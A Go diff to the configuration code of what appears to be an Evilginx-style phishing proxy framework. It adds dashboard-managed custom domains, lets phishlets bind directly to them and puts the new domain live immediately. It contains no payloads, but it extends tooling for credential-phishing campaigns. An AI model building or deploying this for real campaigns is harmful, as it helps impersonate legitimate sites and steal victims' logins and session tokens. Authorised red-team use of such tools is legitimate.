@@ -98,18 +98,28 @@ type Config struct {
 	lures           []*Lure
 	lureIds         []string
 	subphishlets    []*SubPhishlet
+	domainSettings  *DomainSettings
 	cfg             *viper.Viper
 }
 
+// DomainSettings persists the dashboard-managed custom domain list and the
+// per-phishlet selected domain. Stored under its own config key so it does not
+// interfere with the CLI "server" / phishlet hostname logic.
+type DomainSettings struct {
+	Domains          []string          `mapstructure:"domains" json:"domains" yaml:"domains"`
+	PhishletDomain   map[string]string `mapstructure:"phishlet_domain" json:"phishlet_domain" yaml:"phishlet_domain"`
+}
+
 const (
-	CFG_GENERAL      = "general"
-	CFG_CERTIFICATES = "certificates"
-	CFG_LURES        = "lures"
-	CFG_PROXY        = "proxy"
-	CFG_PHISHLETS    = "phishlets"
-	CFG_BLACKLIST    = "blacklist"
-	CFG_SUBPHISHLETS = "subphishlets"
-	CFG_GOPHISH      = "gophish"
+	CFG_GENERAL       = "general"
+	CFG_CERTIFICATES  = "certificates"
+	CFG_LURES         = "lures"
+	CFG_PROXY         = "proxy"
+	CFG_PHISHLETS     = "phishlets"
+	CFG_BLACKLIST     = "blacklist"
+	CFG_SUBPHISHLETS  = "subphishlets"
+	CFG_GOPHISH       = "gophish"
+	CFG_DOMAIN_SETTINGS = "domain_settings"
 )
 
 const DEFAULT_UNAUTH_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -124,6 +134,7 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 		phishletNames:   []string{},
 		lures:           []*Lure{},
 		blacklistConfig: &BlacklistConfig{},
+		domainSettings:  &DomainSettings{PhishletDomain: make(map[string]string)},
 	}
 
 	c.cfg = viper.New()
@@ -192,6 +203,18 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.cfg.UnmarshalKey(CFG_PHISHLETS, &c.phishletConfig)
 	c.cfg.UnmarshalKey(CFG_CERTIFICATES, &c.certificates)
 
+	c.domainSettings = &DomainSettings{Domains: []string{}, PhishletDomain: make(map[string]string)}
+	c.cfg.UnmarshalKey(CFG_DOMAIN_SETTINGS, &c.domainSettings)
+	if c.domainSettings == nil {
+		c.domainSettings = &DomainSettings{Domains: []string{}, PhishletDomain: make(map[string]string)}
+	}
+	if c.domainSettings.Domains == nil {
+		c.domainSettings.Domains = []string{}
+	}
+	if c.domainSettings.PhishletDomain == nil {
+		c.domainSettings.PhishletDomain = make(map[string]string)
+	}
+
 	for i := 0; i < len(c.lures); i++ {
 		c.lureIds = append(c.lureIds, GenRandomToken())
 	}
@@ -235,8 +258,19 @@ func (c *Config) SetSiteHostname(site string, hostname string) bool {
 		return false
 	}
 	if hostname != "" && hostname != c.general.Domain && !strings.HasSuffix(hostname, "."+c.general.Domain) {
-		log.Error("phishlet hostname must end with '%s'", c.general.Domain)
-		return false
+		// Dashboard-managed domains can be bound directly without being a
+		// subdomain of the server's base domain.
+		allowed := false
+		for _, d := range c.domainSettings.Domains {
+			if d == hostname {
+				allowed = true
+				break
+			}
+		}
+		if !allowed {
+			log.Error("phishlet hostname must end with '%s' or be a domain added in the dashboard", c.general.Domain)
+			return false
+		}
 	}
 	log.Info("phishlet '%s' hostname set to: %s", site, hostname)
 	c.PhishletConfig(site).Hostname = hostname
@@ -502,6 +536,13 @@ func (c *Config) EnableAutocert(enabled bool) {
 	}
 	c.cfg.Set(CFG_GENERAL, c.general)
 	c.cfg.WriteConfig()
+}
+
+// RefreshActiveHostnames rebuilds the active-hostname allow-list from enabled
+// phishlets and lures. Exported so the dashboard can refresh after domain
+// changes without a daemon restart.
+func (c *Config) RefreshActiveHostnames() {
+	c.refreshActiveHostnames()
 }
 
 func (c *Config) refreshActiveHostnames() {
@@ -866,4 +907,97 @@ func (c *Config) GetConfig() *GeneralConfig {
 func (c *Config) SaveConfig() {
 	c.cfg.Set(CFG_GENERAL, c.general)
 	c.cfg.WriteConfig()
+}
+
+func (c *Config) GetDomainSettings() *DomainSettings {
+	return c.domainSettings
+}
+
+func (c *Config) SetDomainSettings(ds *DomainSettings) {
+	c.domainSettings = ds
+	c.cfg.Set(CFG_DOMAIN_SETTINGS, c.domainSettings)
+	c.cfg.WriteConfig()
+}
+
+func (c *Config) AddDashboardDomain(domain string) bool {
+	domain = strings.TrimSpace(strings.ToLower(domain))
+	if domain == "" {
+		return false
+	}
+	for _, d := range c.domainSettings.Domains {
+		if d == domain {
+			return false
+		}
+	}
+	c.domainSettings.Domains = append(c.domainSettings.Domains, domain)
+	c.SetDomainSettings(c.domainSettings)
+	return true
+}
+
+func (c *Config) DeleteDashboardDomain(domain string) bool {
+	domain = strings.TrimSpace(strings.ToLower(domain))
+	keep := []string{}
+	found := false
+	for _, d := range c.domainSettings.Domains {
+		if d == domain {
+			found = true
+			continue
+		}
+		keep = append(keep, d)
+	}
+	if !found {
+		return false
+	}
+	// drop phishlet assignments that pointed at this domain
+	for site, d := range c.domainSettings.PhishletDomain {
+		if d == domain {
+			delete(c.domainSettings.PhishletDomain, site)
+		}
+	}
+	c.domainSettings.Domains = keep
+	c.SetDomainSettings(c.domainSettings)
+	return true
+}
+
+func (c *Config) SetPhishletDomain(site string, domain string) bool {
+	if _, err := c.GetPhishlet(site); err != nil {
+		return false
+	}
+	if domain != "" {
+		domain = strings.TrimSpace(strings.ToLower(domain))
+		ok := false
+		for _, d := range c.domainSettings.Domains {
+			if d == domain {
+				ok = true
+				break
+			}
+		}
+		if !ok {
+			return false
+		}
+		// Rebind the phishlet hostname to this domain — this is what makes
+		// lure generation + proxy routing actually use the new domain. Fail
+		// loudly (do NOT silently swallow) if the rebind is rejected.
+		if !c.SetSiteHostname(site, domain) {
+			return false
+		}
+		// Make the new binding live immediately: hostname allow-list + DNS.
+		c.refreshActiveHostnames()
+	} else {
+		delete(c.domainSettings.PhishletDomain, site)
+		c.SetDomainSettings(c.domainSettings)
+	}
+	c.domainSettings.PhishletDomain[site] = domain
+	c.SetDomainSettings(c.domainSettings)
+	return true
+}
+
+func (c *Config) GetPhishletDashboardDomain(site string) string {
+	if d, ok := c.domainSettings.PhishletDomain[site]; ok && d != "" {
+		return d
+	}
+	if d, ok := c.GetSiteDomain(site); ok && d != "" {
+		return d
+	}
+	return ""
 }
